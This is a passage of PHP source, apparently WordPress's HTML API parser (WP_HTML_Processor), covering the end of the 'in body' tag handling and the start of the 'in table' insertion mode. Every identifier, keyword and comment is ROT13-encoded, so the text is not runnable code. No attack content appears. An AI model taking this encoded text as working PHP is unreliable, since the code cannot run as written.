						erghea $guvf->fgrc();
					}

					$guvf->trarengr_vzcyvrq_raq_gntf();
					vs ( $abqr !== $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr() ) {
						// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr. Guvf reebe qbrf abg vzcnpg gur ybtvp urer.
						$guvf->onvy( 'Pnaabg pybfr n SBEZ jura bgure ryrzragf erznva bcra nf guvf jbhyq guebj bss gur oernqpehzof sbe gur sbyybjvat gbxraf.' );
					}

					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->erzbir_abqr( $abqr );
					erghea gehr;
				} ryfr {
					/*
					 * > Vs gur fgnpx bs bcra ryrzragf qbrf abg unir n sbez ryrzrag va fpbcr,
					 * > gura guvf vf n cnefr reebe; erghea naq vtaber gur gbxra.
					 *
					 * Abgr gung hayvxr va gur pynhfr nobir, guvf vf purpxvat sbe nal SBEZ va fpbcr.
					 */
					vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( 'SBEZ' ) ) {
						// Cnefr reebe: vtaber gur gbxra.
						erghea $guvf->fgrc();
					}

					$guvf->trarengr_vzcyvrq_raq_gntf();

					vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'SBEZ' ) ) {
						// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr. Guvf reebe qbrf abg vzcnpg gur ybtvp urer.
					}

					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'SBEZ' );
					erghea gehr;
				}
				oernx;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"c\"
			 */
			pnfr '-C':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_c_va_ohggba_fpbcr() ) {
					$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				}

				$guvf->pybfr_n_c_ryrzrag();
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"yv\"
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"qq\", \"qg\"
			 */
			pnfr '-QQ':
			pnfr '-QG':
			pnfr '-YV':
				vs (
					/*
					 * Na raq gnt jubfr gnt anzr vf \"yv\":
					 * Vs gur fgnpx bs bcra ryrzragf qbrf abg unir na yv ryrzrag va yvfg vgrz fpbcr,
					 * gura guvf vf n cnefr reebe; vtaber gur gbxra.
					 */
					(
						'YV' === $gbxra_anzr &&
						! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_yvfg_vgrz_fpbcr( 'YV' )
					) ||
					/*
					 * Na raq gnt jubfr gnt anzr vf bar bs: \"qq\", \"qg\":
					 * Vs gur fgnpx bs bcra ryrzragf qbrf abg unir na ryrzrag va fpbcr gung vf na
					 * UGZY ryrzrag jvgu gur fnzr gnt anzr nf gung bs gur gbxra, gura guvf vf n
					 * cnefr reebe; vtaber gur gbxra.
					 */
					(
						'YV' !== $gbxra_anzr &&
						! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( $gbxra_anzr )
					)
				) {
					/*
					 * Guvf vf n cnefr reebe, vtaber gur gbxra.
					 *
					 * @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
					 */
					erghea $guvf->fgrc();
				}

				$guvf->trarengr_vzcyvrq_raq_gntf( $gbxra_anzr );

				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( $gbxra_anzr ) ) {
					// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr. Guvf reebe qbrf abg vzcnpg gur ybtvp urer.
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( $gbxra_anzr );
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"u1\", \"u2\", \"u3\", \"u4\", \"u5\", \"u6\"
			 */
			pnfr '-U1':
			pnfr '-U2':
			pnfr '-U3':
			pnfr '-U4':
			pnfr '-U5':
			pnfr '-U6':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( '(vagreany: U1 guebhtu U6 - qb abg hfr)' ) ) {
					/*
					 * Guvf vf n cnefr reebe; vtaber gur gbxra.
					 *
					 * @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
					 */
					erghea $guvf->fgrc();
				}

				$guvf->trarengr_vzcyvrq_raq_gntf();

				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( $gbxra_anzr ) ) {
					// @gbqb Erpbeq cnefr reebe: guvf reebe qbrfa'g vzcnpg cnefvat.
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( '(vagreany: U1 guebhtu U6 - qb abg hfr)' );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"n\"
			 */
			pnfr '+N':
				sbernpu ( $guvf->fgngr->npgvir_sbeznggvat_ryrzragf->jnyx_hc() nf $vgrz ) {
					fjvgpu ( $vgrz->abqr_anzr ) {
						pnfr 'znexre':
							oernx 2;

						pnfr 'N':
							$guvf->eha_nqbcgvba_ntrapl_nytbevguz();
							$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->erzbir_abqr( $vgrz );
							$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->erzbir_abqr( $vgrz );
							oernx 2;
					}
				}

				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->chfu( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"o\", \"ovt\", \"pbqr\", \"rz\", \"sbag\", \"v\",
			 * > \"f\", \"fznyy\", \"fgevxr\", \"fgebat\", \"gg\", \"h\"
			 */
			pnfr '+O':
			pnfr '+OVT':
			pnfr '+PBQR':
			pnfr '+RZ':
			pnfr '+SBAG':
			pnfr '+V':
			pnfr '+F':
			pnfr '+FZNYY':
			pnfr '+FGEVXR':
			pnfr '+FGEBAT':
			pnfr '+GG':
			pnfr '+H':
				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->chfu( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"aboe\"
			 */
			pnfr '+ABOE':
				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();

				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( 'ABOE' ) ) {
					// Cnefr reebe.
					$guvf->eha_nqbcgvba_ntrapl_nytbevguz();
					$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->chfu( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"n\", \"o\", \"ovt\", \"pbqr\", \"rz\", \"sbag\", \"v\",
			 * > \"aboe\", \"f\", \"fznyy\", \"fgevxr\", \"fgebat\", \"gg\", \"h\"
			 */
			pnfr '-N':
			pnfr '-O':
			pnfr '-OVT':
			pnfr '-PBQR':
			pnfr '-RZ':
			pnfr '-SBAG':
			pnfr '-V':
			pnfr '-ABOE':
			pnfr '-F':
			pnfr '-FZNYY':
			pnfr '-FGEVXR':
			pnfr '-FGEBAT':
			pnfr '-GG':
			pnfr '-H':
				$guvf->eha_nqbcgvba_ntrapl_nytbevguz();
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"nccyrg\", \"znedhrr\", \"bowrpg\"
			 */
			pnfr '+NCCYRG':
			pnfr '+ZNEDHRR':
			pnfr '+BOWRPG':
				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->vafreg_znexre();
				$guvf->fgngr->senzrfrg_bx = snyfr;
				erghea gehr;

			/*
			 * > N raq gnt gbxra jubfr gnt anzr vf bar bs: \"nccyrg\", \"znedhrr\", \"bowrpg\"
			 */
			pnfr '-NCCYRG':
			pnfr '-ZNEDHRR':
			pnfr '-BOWRPG':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( $gbxra_anzr ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				$guvf->trarengr_vzcyvrq_raq_gntf();
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( $gbxra_anzr ) ) {
					// Guvf vf n cnefr reebe.
				}

				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( $gbxra_anzr );
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->pyrne_hc_gb_ynfg_znexre();
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"gnoyr\"
			 */
			pnfr '+GNOYR':
				/*
				 * > Vs gur Qbphzrag vf abg frg gb dhvexf zbqr, naq gur fgnpx bs bcra ryrzragf
				 * > unf n c ryrzrag va ohggba fpbcr, gura pybfr n c ryrzrag.
				 */
				vs (
					JC_UGZY_Gnt_Cebprffbe::DHVEXF_ZBQR !== $guvf->pbzcng_zbqr &&
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_c_va_ohggba_fpbcr()
				) {
					$guvf->pybfr_n_c_ryrzrag();
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->senzrfrg_bx    = snyfr;
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR;
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"oe\"
			 *
			 * Guvf vf ceriragrq sebz unccravat orpnhfr gur Gnt Cebprffbe
			 * ercbegf nyy pybfvat OE gntf nf vs gurl jrer bcravat gntf.
			 */

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"nern\", \"oe\", \"rzorq\", \"vzt\", \"xrltra\", \"joe\"
			 */
			pnfr '+NERN':
			pnfr '+OE':
			pnfr '+RZORQ':
			pnfr '+VZT':
			pnfr '+XRLTRA':
			pnfr '+JOE':
				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->senzrfrg_bx = snyfr;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"vachg\"
			 */
			pnfr '+VACHG':
				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );

				/*
				 * > Vs gur gbxra qbrf abg unir na nggevohgr jvgu gur anzr \"glcr\", be vs vg qbrf,
				 * > ohg gung nggevohgr'f inyhr vf abg na NFPVV pnfr-vafrafvgvir zngpu sbe gur
				 * > fgevat \"uvqqra\", gura: frg gur senzrfrg-bx synt gb \"abg bx\".
				 */
				$glcr_nggevohgr = $guvf->trg_nggevohgr( 'glcr' );
				vs ( ! vf_fgevat( $glcr_nggevohgr ) || 'uvqqra' !== fgegbybjre( $glcr_nggevohgr ) ) {
					$guvf->fgngr->senzrfrg_bx = snyfr;
				}

				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"cnenz\", \"fbhepr\", \"genpx\"
			 */
			pnfr '+CNENZ':
			pnfr '+FBHEPR':
			pnfr '+GENPX':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ue\"
			 */
			pnfr '+UE':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_c_va_ohggba_fpbcr() ) {
					$guvf->pybfr_n_c_ryrzrag();
				}
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->senzrfrg_bx = snyfr;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"vzntr\"
			 */
			pnfr '+VZNTR':
				/*
				 * > Cnefr reebe. Punatr gur gbxra'f gnt anzr gb \"vzt\" naq ercebprff vg. (Qba'g nfx.)
				 *
				 * Abgr gung guvf vf unaqyrq ryfrjurer, fb vg fubhyq abg or cbffvoyr gb ernpu guvf pbqr.
				 */
				$guvf->onvy( \"Pnaabg cebprff na VZNTR gnt. (Qba'g nfx.)\" );
				oernx;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"grkgnern\"
			 */
			pnfr '+GRKGNERN':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );

				/*
				 * > Vs gur arkg gbxra vf n H+000N YVAR SRRQ (YS) punenpgre gbxra, gura vtaber
				 * > gung gbxra naq zbir ba gb gur arkg bar. (Arjyvarf ng gur fgneg bs
				 * > grkgnern ryrzragf ner vtaberq nf na nhgubevat pbairavrapr.)
				 *
				 * Guvf vf unaqyrq va `trg_zbqvsvnoyr_grkg()`.
				 */

				$guvf->fgngr->senzrfrg_bx = snyfr;

				/*
				 * > Fjvgpu gur vafregvba zbqr gb \"grkg\".
				 *
				 * Nf n frys-pbagnvarq abqr, guvf orunivbe vf unaqyrq va gur Gnt Cebprffbe.
				 */
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"kzc\"
			 */
			pnfr '+KZC':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_c_va_ohggba_fpbcr() ) {
					$guvf->pybfr_n_c_ryrzrag();
				}

				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
				$guvf->fgngr->senzrfrg_bx = snyfr;

				/*
				 * > Sbyybj gur trarevp enj grkg ryrzrag cnefvat nytbevguz.
				 *
				 * Nf n frys-pbagnvarq abqr, guvf orunivbe vf unaqyrq va gur Gnt Cebprffbe.
				 */
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * N fgneg gnt jubfr gnt anzr vf \"vsenzr\"
			 */
			pnfr '+VSENZR':
				$guvf->fgngr->senzrfrg_bx = snyfr;

				/*
				 * > Sbyybj gur trarevp enj grkg ryrzrag cnefvat nytbevguz.
				 *
				 * Nf n frys-pbagnvarq abqr, guvf orunivbe vf unaqyrq va gur Gnt Cebprffbe.
				 */
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"abrzorq\"
			 * > N fgneg gnt jubfr gnt anzr vf \"abfpevcg\", vs gur fpevcgvat synt vf ranoyrq
			 *
			 * Gur fpevcgvat synt vf arire ranoyrq va guvf cnefre.
			 */
			pnfr '+ABRZORQ':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"fryrpg\"
			 */
			pnfr '+FRYRPG':
				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->senzrfrg_bx = snyfr;

				fjvgpu ( $guvf->fgngr->vafregvba_zbqr ) {
					/*
					 * > Vs gur vafregvba zbqr vf bar bs \"va gnoyr\", \"va pncgvba\", \"va gnoyr obql\", \"va ebj\",
					 * > be \"va pryy\", gura fjvgpu gur vafregvba zbqr gb \"va fryrpg va gnoyr\".
					 */
					pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR:
					pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PNCGVBA:
					pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GNOYR_OBQL:
					pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_EBJ:
					pnfr JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PRYY:
						$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_FRYRPG_VA_GNOYR;
						oernx;

					/*
					 * > Bgurejvfr, fjvgpu gur vafregvba zbqr gb \"va fryrpg\".
					 */
					qrsnhyg:
						$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_FRYRPG;
						oernx;
				}
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"bcgtebhc\", \"bcgvba\"
			 */
			pnfr '+BCGTEBHC':
			pnfr '+BCGVBA':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'BCGVBA' ) ) {
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				}
				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"eo\", \"egp\"
			 */
			pnfr '+EO':
			pnfr '+EGP':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( 'EHOL' ) ) {
					$guvf->trarengr_vzcyvrq_raq_gntf();

					vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( 'EHOL' ) ) {
						// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
					}
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"ec\", \"eg\"
			 */
			pnfr '+EC':
			pnfr '+EG':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( 'EHOL' ) ) {
					$guvf->trarengr_vzcyvrq_raq_gntf( 'EGP' );

					$pheerag_abqr_anzr = $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr()->abqr_anzr;
					vs ( 'EGP' === $pheerag_abqr_anzr || 'EHOL' === $pheerag_abqr_anzr ) {
						// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
					}
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"zngu\"
			 */
			pnfr '+ZNGU':
				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();

				/*
				 * @gbqb Nqwhfg ZnguZY nggevohgrf sbe gur gbxra. (Guvf svkrf gur pnfr bs ZnguZY nggevohgrf gung ner abg nyy ybjrepnfr.)
				 * @gbqb Nqwhfg sbervta nggevohgrf sbe gur gbxra. (Guvf svkrf gur hfr bs anzrfcnprq nggevohgrf, va cnegvphyne KYvax.)
				 *
				 * Gurfr bhtug gb or unaqyrq va gur nggevohgr zrgubqf.
				 */
				$guvf->fgngr->pheerag_gbxra->anzrfcnpr = 'zngu';
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				vs ( $guvf->fgngr->pheerag_gbxra->unf_frys_pybfvat_synt ) {
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				}
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"fit\"
			 */
			pnfr '+FIT':
				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();

				/*
				 * @gbqb Nqwhfg FIT nggevohgrf sbe gur gbxra. (Guvf svkrf gur pnfr bs FIT nggevohgrf gung ner abg nyy ybjrepnfr.)
				 * @gbqb Nqwhfg sbervta nggevohgrf sbe gur gbxra. (Guvf svkrf gur hfr bs anzrfcnprq nggevohgrf, va cnegvphyne KYvax va FIT.)
				 *
				 * Gurfr bhtug gb or unaqyrq va gur nggevohgr zrgubqf.
				 */
				$guvf->fgngr->pheerag_gbxra->anzrfcnpr = 'fit';
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				vs ( $guvf->fgngr->pheerag_gbxra->unf_frys_pybfvat_synt ) {
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				}
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"pncgvba\", \"pby\", \"pbytebhc\",
			 * > \"senzr\", \"urnq\", \"gobql\", \"gq\", \"gsbbg\", \"gu\", \"gurnq\", \"ge\"
			 */
			pnfr '+PNCGVBA':
			pnfr '+PBY':
			pnfr '+PBYTEBHC':
			pnfr '+SENZR':
			pnfr '+URNQ':
			pnfr '+GOBQL':
			pnfr '+GQ':
			pnfr '+GSBBG':
			pnfr '+GU':
			pnfr '+GURNQ':
			pnfr '+GE':
				// Cnefr reebe. Vtaber gur gbxra.
				erghea $guvf->fgrc();
		}

		vs ( ! cnerag::vf_gnt_pybfre() ) {
			/*
			 * > Nal bgure fgneg gnt
			 */
			$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
			$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
			erghea gehr;
		} ryfr {
			/*
			 * > Nal bgure raq gnt
			 */

			/*
			 * Svaq gur pbeerfcbaqvat gnt bcrare va gur fgnpx bs bcra ryrzragf, vs
			 * vg rkvfgf orsber ernpuvat n fcrpvny ryrzrag, juvpu cebivqrf n xvaq
			 * bs obhaqnel va gur fgnpx. Sbe rknzcyr, n `</phfgbz-gnt>` fubhyq abg
			 * pybfr nalguvat orlbaq vgf pbagnvavat `C` be `QVI` ryrzrag.
			 */
			sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc() nf $abqr ) {
				vs ( 'ugzy' === $abqr->anzrfcnpr && $gbxra_anzr === $abqr->abqr_anzr ) {
					oernx;
				}

				vs ( frys::vf_fcrpvny( $abqr ) ) {
					// Guvf vf n cnefr reebe, vtaber gur gbxra.
					erghea $guvf->fgrc();
				}
			}

			$guvf->trarengr_vzcyvrq_raq_gntf( $gbxra_anzr );
			vs ( $abqr !== $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr() ) {
				// @gbqb Erpbeq cnefr reebe: guvf reebe qbrfa'g vzcnpg cnefvat.
			}

			sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc() nf $vgrz ) {
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				vs ( $abqr === $vgrz ) {
					erghea gehr;
				}
			}
		}

		$guvf->onvy( 'Fubhyq abg unir orra noyr gb ernpu raq bs VA OBQL cebprffvat. Purpx UGZY NCV pbqr.' );
		// Guvf haarprffnel erghea ceriragf gbbyf sebz vanpphengryl ercbegvat glcr reebef.
		erghea snyfr;
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va gnoyr' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va gnoyr' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vagnoyr
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_gnoyr(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( cnerag::vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N punenpgre gbxra, vs gur pheerag abqr vf gnoyr,
			 * > gobql, grzcyngr, gsbbg, gurnq, be ge ryrzrag
			 */
			pnfr '#grkg':
				$pheerag_abqr      = $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr();
				$pheerag_abqr_anzr = $pheerag_abqr ? $pheerag_abqr->abqr_anzr : ahyy;
				vs (
					$pheerag_abqr_anzr && (
						'GNOYR' === $pheerag_abqr_anzr ||
						'GOBQL' === $pheerag_abqr_anzr ||
						'GRZCYNGR' === $pheerag_abqr_anzr ||
						'GSBBG' === $pheerag_abqr_anzr ||
						'GURNQ' === $pheerag_abqr_anzr ||
						'GE' === $pheerag_abqr_anzr
					)
				) {
					/*
					 * Vs gur grkg vf rzcgl nsgre cebprffvat UGZY ragvgvrf naq fgevccvat
					 * H+0000 AHYY olgrf gura vtaber gur gbxra.
					 */
					vs ( cnerag::GRKG_VF_AHYY_FRDHRAPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
						erghea $guvf->fgrc();
					}

					/*
					 * Guvf sbyybjf gur ehyrf sbe \"va gnoyr grkg\" vafregvba zbqr.
					 *
					 * Juvgrfcnpr-bayl grkg abqrf ner vafregrq va-cynpr. Bgurejvfr
					 * sbfgre cneragvat vf ranoyrq naq gur abqrf jbhyq or
					 * vafregrq bhg-bs-cynpr.
					 *
					 * > Vs nal bs gur gbxraf va gur craqvat gnoyr punenpgre gbxraf
					 * > yvfg ner punenpgre gbxraf gung ner abg NFPVV juvgrfcnpr,
					 * > gura guvf vf n cnefr reebe: ercebprff gur punenpgre gbxraf
					 * > va gur craqvat gnoyr punenpgre gbxraf yvfg hfvat gur ehyrf
					 * > tvira va gur \"nalguvat ryfr\" ragel va gur \"va gnoyr\"
					 * > vafregvba zbqr.
					 * >
					 * > Bgurejvfr, vafreg gur punenpgref tvira ol gur craqvat gnoyr
					 * > punenpgre gbxraf yvfg.
					 *
					 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vagnoyrgrkg
					 */
					vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
						$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
						erghea gehr;
					}

					// Aba-juvgrfcnpr jbhyq gevttre sbfgrevat, hafhccbegrq ng guvf gvzr.
					$guvf->onvy( 'Sbfgre cneragvat vf abg fhccbegrq.' );
					oernx;
				}
				oernx;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"pncgvba\"
			 */
			pnfr '+PNCGVBA':
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_pbagrkg();
				$guvf->fgngr->npgvir_sbeznggvat_ryrzragf->vafreg_znexre();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PNCGVBA;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"pbytebhc\"
			 */
			pnfr '+PBYTEBHC':
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_pbagrkg();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PBYHZA_TEBHC;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"pby\"
			 */
			pnfr '+PBY':
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_pbagrkg();

				/*
				 * > Vafreg na UGZY ryrzrag sbe n \"pbytebhc\" fgneg gnt gbxra jvgu ab nggevohgrf,
				 * > gura fjvgpu gur vafregvba zbqr gb \"va pbyhza tebhc\".
				 */
				$guvf->vafreg_iveghny_abqr( 'PBYTEBHC' );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_PBYHZA_TEBHC;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"gobql\", \"gsbbg\", \"gurnq\"
			 */
			pnfr '+GOBQL':
			pnfr '+GSBBG':
			pnfr '+GURNQ':
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pyrne_gb_gnoyr_pbagrkg();
